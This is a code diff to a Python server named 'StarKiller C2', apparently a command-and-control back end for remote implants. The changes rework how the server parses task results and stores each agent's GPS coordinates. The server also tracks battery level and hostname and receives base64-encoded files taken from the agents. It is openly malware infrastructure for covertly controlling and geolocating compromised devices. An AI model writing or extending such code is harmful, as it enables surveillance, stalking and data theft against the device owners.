@@ -132,7 +132,9 @@ def agent_handler(sock, addr):
                         agents[agent_id]["last_seen"] = time.time()
                         if "battery" in msg:
                             agents[agent_id]["battery"] = msg["battery"]
-                        if "gps" in msg:
+                        if "last_gps" in msg:
+                            agents[agent_id]["last_gps"] = msg["last_gps"]
+                        elif "gps" in msg:
                             agents[agent_id]["last_gps"] = msg["gps"]
 
             elif msg_type == "output":
@@ -140,18 +142,23 @@ def agent_handler(sock, addr):
                 console_write(f"  [{info['hostname']}] {line}")
 
             elif msg_type == "result":
-                status = msg.get("status", "?")
                 task_id = msg.get("task_id", "?")
-                icon = "+" if status == "ok" else "!"
-                console_write(f"[{icon}] [{info['hostname']}] Task {task_id}: {status}")
-                data = msg.get("data")
-                if data and isinstance(data, dict):
-                    if "error" in data:
-                        console_write(f"  [{info['hostname']}] Error: {data['error']}")
-                    if "gps" in data:
-                        with agents_lock:
-                            if agent_id in agents:
-                                agents[agent_id]["last_gps"] = data["gps"]
+                data = msg.get("data", {})
+                if isinstance(data, dict) and "error" in data:
+                    console_write(f"[!] [{info['hostname']}] Task {task_id} error: {data['error']}")
+                else:
+                    summary = ""
+                    if isinstance(data, dict):
+                        keys = list(data.keys())[:5]
+                        summary = ", ".join(f"{k}={data[k]}" for k in keys if not isinstance(data[k], (list, dict)))
+                        for k in keys:
+                            if isinstance(data[k], list):
+                                summary += f", {k}=[{len(data[k])} items]"
+                        if "latitude" in data:
+                            with agents_lock:
+                                if agent_id in agents:
+                                    agents[agent_id]["last_gps"] = f"{data['latitude']},{data['longitude']}"
+                    console_write(f"[+] [{info['hostname']}] Task {task_id} OK: {summary[:200]}")
 
             elif msg_type == "file_data":
                 raw = base64.b64decode(msg.get("data", ""))
@@ -205,7 +212,7 @@ def dispatch_task(agent_id, op, **kwargs):
             return {"error": "Agent not connected"}
 
     task_id = uuid.uuid4().hex[:6]
-    task = {"type": "task", "id": task_id, "op": op, **kwargs}
+    task = {"type": "task", "task_id": task_id, "op": op, **kwargs}
 
     try:
         agent_send(info["sock"], task)
@@ -636,13 +643,13 @@ class StarKillerHandler(BaseHTTPRequestHandler):
 
 
 def main():
+    global AGENT_PORT
     import argparse
     parser = argparse.ArgumentParser()
     parser.add_argument("--port", type=int, default=DASHBOARD_PORT)
     parser.add_argument("--agent-port", type=int, default=AGENT_PORT)
     args = parser.parse_args()
 
-    global AGENT_PORT
     AGENT_PORT = args.agent_port
 
     console_write("StarKiller C2 initialised")
